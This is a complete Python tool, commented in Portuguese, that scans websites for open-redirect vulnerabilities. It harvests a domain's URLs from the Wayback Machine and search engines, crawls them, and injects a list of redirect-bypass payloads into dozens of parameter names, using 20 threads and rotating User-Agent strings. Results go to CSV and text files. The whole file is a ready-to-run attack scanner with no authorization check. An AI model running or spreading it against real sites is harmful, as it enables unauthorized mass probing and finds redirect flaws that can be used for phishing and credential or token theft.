import requests, re, json
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, urljoin
import concurrent.futures, random, threading, csv, argparse, time
from collections import deque

# ---------------- CONFIGURAÇÃO ----------------
params_to_test = [
    "url","uri","path","goto","target","redir","redirect","redirect_url","redirect_uri",
    "return","returnTo","return_url","returnUri","continue","continueTo","continueUrl",
    "next","next_url","nextUri","forward","forward_url","location","dest","destination",
    "dest_url","to","out","outUrl","ref","referrer","page","login_url","logout_url",
    "success_url","failure_url","redirectTo","go","jump","link","u","r","n","callback",
    "callback_url","cb"
]

TEST_DOMAIN = "https://meu-webhook.com"
MAX_THREADS = 20
MAX_CRAWL_DEPTH = 2
BATCH_SIZE = 5  # quantidade de payloads testados por vez para reduzir RAM
lock = threading.Lock()
VERBOSE = False

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/114.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/117.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1) Safari/604.1"
]

payloads = [
    TEST_DOMAIN,
    "//" + TEST_DOMAIN.replace("https://","").replace("http://",""),
    TEST_DOMAIN + "/%2e%2e",
    TEST_DOMAIN + "%2F..%2F",
    quote(TEST_DOMAIN),
    quote("//" + TEST_DOMAIN.replace("https://","")),
    TEST_DOMAIN + "#@legit.com",
    TEST_DOMAIN + "@legit.com",
    TEST_DOMAIN + "/./",
    TEST_DOMAIN + "/../",
    TEST_DOMAIN + "?param=test",
    TEST_DOMAIN + "&param=test",
    "https://sub." + TEST_DOMAIN.replace("https://",""),
    TEST_DOMAIN + "/login",
    TEST_DOMAIN + "/redirect",
    TEST_DOMAIN + "#fragment",
    TEST_DOMAIN + "/#/",
    TEST_DOMAIN + "?next=" + TEST_DOMAIN,
    TEST_DOMAIN.replace("https://", "%68%74%74%70%73%3A%2F%2F")
]

# ---------------- CORES ----------------
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
RESET = "\033[0m"

vulnerable_txt = "vulnerable_urls.txt"
safe_txt = "safe_urls.txt"
results_csv = "vulnerable_urls.csv"

visited_urls = set()
discovered_subdomains = set()

# ---------------- AUXILIARES ----------------
def log(msg):
    if VERBOSE:
        print(msg, flush=True)

def random_headers():
    return {"User-Agent": random.choice(user_agents)}

def save_result(url, param, payload, location, status):
    with lock:
        with open(results_csv, "a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow([url, param, payload, status, location])
        with open(vulnerable_txt, "a", encoding="utf-8") as f:
            f.write(f"{url} | {param}={payload}\n")

def mark_safe(url, param, payload):
    with lock:
        with open(safe_txt, "a", encoding="utf-8") as f:
            f.write(f"{url} | {param}={payload}\n")

def normalize_url(url):
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    parsed = urlparse(url)
    netloc = parsed.netloc.lower().replace("www.", "")
    path = parsed.path or "/"
    return urlunparse((parsed.scheme, netloc, path, parsed.params, parsed.query, parsed.fragment))

# ---------------- TESTE OPEN REDIRECT COM LOTES ----------------
def test_url_batch(url, param, payload_batch):
    url = normalize_url(url)
    for payload in payload_batch:
        try:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            query_params[param] = payload
            new_query = urlencode(query_params, doseq=True)
            new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            resp = requests.get(new_url, headers=random_headers(), timeout=6, allow_redirects=False)
            location = resp.headers.get("Location", "")

            with lock:
                if resp.status_code in (301,302,303,307,308) and TEST_DOMAIN in location:
                    print(f"{GREEN}[VULNERÁVEL]{RESET} {new_url} -> {location} | Payload: {payload}", flush=True)
                    save_result(url, param, payload, location, resp.status_code)
                else:
                    print(f"{RED}[SEGURO]{RESET} {new_url} | Payload: {payload}", flush=True)
                    mark_safe(url, param, payload)
        except Exception as e:
            log(f"[ERRO] {url}: {e}")

# ---------------- EXTRAÇÃO DE PARÂMETROS ----------------
def extract_params(html):
    params = set()
    soup = BeautifulSoup(html, "html.parser")
    for form in soup.find_all("form"):
        for inp in form.find_all("input", {"name": True}):
            params.add(inp['name'])
    scripts = soup.find_all("script")
    for s in scripts:
        matches = re.findall(r'[?&](\w+)=', s.text)
        for m in matches:
            params.add(m)
    return params

# ---------------- CRAWLER COM FILA ----------------
def crawl(url, depth, executor, urls_queue):
    url = normalize_url(url)
    if depth > MAX_CRAWL_DEPTH or url in visited_urls:
        return
    with lock:
        visited_urls.add(url)
    try:
        resp = requests.get(url, headers=random_headers(), timeout=6)
        if "text/html" not in resp.headers.get("Content-Type",""):
            return

        params = extract_params(resp.text)
        soup = BeautifulSoup(resp.text, "html.parser")
        links = [urljoin(url, a["href"]) for a in soup.find_all("a", href=True)]
        domain = urlparse(url).netloc

        for link in links:
            parsed = urlparse(link)
            if parsed.netloc and parsed.netloc != domain:
                with lock:
                    discovered_subdomains.add(parsed.netloc)
            elif parsed.scheme.startswith("http") and parsed.netloc.endswith(domain):
                with lock:
                    if link not in visited_urls:
                        urls_queue.append((link, depth+1))

        # Teste em lotes para reduzir memória
        for param in params.union(params_to_test):
            for i in range(0, len(payloads), BATCH_SIZE):
                batch = payloads[i:i+BATCH_SIZE]
                executor.submit(test_url_batch, url, param, batch)
    except Exception as e:
        log(f"[ERRO] Crawl {url}: {e}")

# ---------------- COLETA DE URLS ----------------
def collect_wayback(domain):
    urls = set()
    try:
        resp = requests.get(f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey", timeout=15)
        data = resp.json()
        for entry in data[1:]:
            url = entry[0]
            if url.startswith("http") and domain in url:
                urls.add(url)
                log(f"{BLUE}[WAYBACK]{RESET} {url}")
    except:
        pass
    return urls

def collect_search_engines(domain):
    urls = set()
    headers = {"User-Agent": random.choice(user_agents)}
    for page in range(2):
        try:
            r = requests.get(f"https://www.bing.com/search?q=site:{domain}&first={page*10}", headers=headers, timeout=10)
            soup = BeautifulSoup(r.text, "html.parser")
            for a in soup.find_all("a", href=True):
                href = a['href']
                if domain in urlparse(href).netloc:
                    urls.add(href)
        except: pass
    for page in range(2):
        try:
            r = requests.get(f"https://html.duckduckgo.com/html/?q=site:{domain}&s={page*50}", headers=headers, timeout=10)
            soup = BeautifulSoup(r.text, "html.parser")
            for a in soup.find_all("a", href=True):
                href = a['href']
                if domain in urlparse(href).netloc:
                    urls.add(href)
        except: pass
    return urls

# ---------------- MAIN ----------------
def main():
    global VERBOSE
    parser = argparse.ArgumentParser(description="Open Redirect Scanner Ultra-Agressivo")
    parser.add_argument("-u","--url", help="URL única para testar")
    parser.add_argument("-l","--list", help="Arquivo com lista de URLs")
    parser.add_argument("-v","--verbose", action="store_true", help="Modo verbose")
    args = parser.parse_args()
    VERBOSE = args.verbose

    urls_to_scan = set()
    if args.url:
        urls_to_scan.add(args.url)
        domain = urlparse(normalize_url(args.url)).netloc
        urls_to_scan.update(collect_wayback(domain))
        urls_to_scan.update(collect_search_engines(domain))
    elif args.list:
        with open(args.list, "r") as f:
            urls_to_scan.update(normalize_url(line.strip()) for line in f if line.strip())
    else:
        print("[!] Informe -u <URL> ou -l <arquivo>")
        return

    with open(results_csv,"w",newline="",encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["URL","Parâmetro","Payload","Status Code","Location"])
    open(vulnerable_txt,"w").close()
    open(safe_txt,"w").close()

    print(f"[INFO] Total URLs coletadas: {len(urls_to_scan)}", flush=True)

    urls_queue = deque([(url,0) for url in urls_to_scan])

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        while urls_queue:
            url, depth = urls_queue.popleft()
            crawl(url, depth, executor, urls_queue)

    print("\n==================== RESUMO ====================")
    with open(vulnerable_txt,"r") as f: vuln_lines = f.readlines()
    with open(safe_txt,"r") as f: safe_lines = f.readlines()
    print(f"Total URLs testadas: {len(vuln_lines)+len(safe_lines)}")
    print(f"{GREEN}Vulneráveis: {len(vuln_lines)}{RESET}")
    print(f"{RED}Seguras: {len(safe_lines)}{RESET}")
    print("================================================")
    print(f"{BLUE}Subdomínios descobertos:{RESET}")
    for sub in discovered_subdomains:
        print(sub)

if __name__ == "__main__":
    main()
